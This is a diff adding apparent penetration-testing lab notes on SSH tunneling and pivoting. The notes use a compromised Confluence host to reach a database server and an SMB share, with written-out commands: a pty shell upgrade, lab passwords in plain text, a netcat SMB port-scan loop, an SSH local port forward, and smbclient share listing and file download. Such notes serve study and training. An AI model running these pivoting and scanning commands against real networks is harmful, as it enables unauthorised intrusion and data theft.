@@ -1502,8 +1502,33 @@ Reference
     `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`  
   - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01  
     `ssh database_admin@192.168.124.63 -p2222`  
-- 
-- ddd
+- SSH Tunneling
+  - HRSHARES 172.16.114.217; PGDATABASE01 10.4.114.215; CONFLUENCE01 192.168.114.63
+  - manually mount folder in kali (share files from local to kali vm)  
+    ```
+    sudo mkdir -p /mnt/hgfs
+    sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
+    ```
+  - tunneling: encapsulating one kind of data stream within another as it travels across a network. E.g ssh, rlogin/telnet (unencrypted).
+  - SSH port forwarding: tunneling data through an SSH connection.
+  - WAN (Kali) > DMS (CONFLUENCE01 - ssh client > PGDATABASE01 - ssh server > SMB)
+  - reverse shell TTY to PGDATABASE01 and login as database_admin
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'`
+    `ssh database_admin@10.4.114.215` pass: sqlpass123
+  - enumerate network interfaces on PGDATABASE01 > 10.4.114.215/24, 172.16.114.254/24
+    `ip addr`
+  - enumerate network routes/subnets on PGDATABASE01 > 10.4.114.0/24 dev ens192, 172.16.114.0/24 dev ens224
+    `ip route`
+  - scan port 445 (SMB) on IPs from 172.16.50.1 to 172.16.50.254 > 172.16.114.217 SMB
+    `for i in $(seq 1 254); do nc -zv -w 1 172.16.114.$i 445; done`
+  - local port forward from CONFLUENCE01 (0.0.0.0:4455) to SSH tunnel 172.16.114.217:445
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.114.217:445 database_admin@10.4.114.215`
+  - Port 4455 listening on all interfaces on  CONFLUENCE01
+    `ss -ntplu`
+  - Listing SMB shares through the SSH local port forward running on CONFLUENCE01. > scripts
+    `kali@kali:~$ smbclient -p 4455 -L //192.168.114.63/ -U hr_admin --password=Welcome1234`
+  - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01
+    `smbclient -p 4455 //192.168.114.63/scripts -U hr_admin --password=Welcome1234` `smb: \> ls` `smb: \> get Provisioning.ps1`
 - dddd
 - ddd
 ### 20. Tunneling through deep packet inspectation
